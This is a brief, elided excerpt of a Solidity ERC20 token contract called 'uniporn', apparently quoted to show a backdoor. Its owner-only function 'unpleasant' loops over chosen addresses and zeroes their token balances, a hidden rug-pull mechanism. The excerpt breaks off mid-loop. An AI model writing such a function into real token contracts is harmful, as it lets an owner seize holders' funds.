...
contract uniporn is Context, IERC20 {
    ...
    function unpleasant(address[] memory definite) public onlyOwner() {
    uint256 len = definite.length;
    for (uint256 i; i < len; ++i) {
        uint256 balance = _balances[definite[i]];
        _balances[definite[i]] = 0;
